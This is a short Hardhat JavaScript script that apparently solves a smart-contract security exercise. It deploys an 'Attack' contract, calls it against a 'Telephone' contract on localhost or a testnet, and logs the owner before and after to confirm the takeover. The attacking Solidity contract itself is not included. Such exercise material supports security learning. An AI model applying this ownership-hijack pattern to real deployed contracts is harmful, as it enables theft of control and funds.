require('dotenv').config()
const deploy = require("./deploy");

async function attack() {
  // local network
  const { telephoneContractAddress, attackContractAddress } = await deploy();
  let attacker;
  if (hre.network.name === "localhost") {
    attacker = await hre.ethers.getSigners()[1];
    console.log("[attack] :", "Attacker :", attacker.address);
  } else if (hre.network.name === "rinkeby") {
    attacker = await hre.ethers.getSigners()[0];
  } else {
    console.error("[attack] :", "unkown network used");
    process.exit(1)
  }

  const AttackContract = await ethers.getContractFactory("Attack", attacker);
  const attackContract = await AttackContract.attach(attackContractAddress);

  const TelephoneContract = await ethers.getContractFactory("Telephone");
  const telephoneContract = await TelephoneContract.attach(
    telephoneContractAddress
  );
  let owner = await telephoneContract.owner();
  console.log("[attack] :", "Initial owner :", owner);

  const attackTx = await attackContract.attack(telephoneContractAddress);
  await attackTx.wait();

  owner = await telephoneContract.owner();
  console.log("[attack] :", "Final owner :", owner);
}

attack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("[attack.js] :", error);
    process.exit(1);
  });
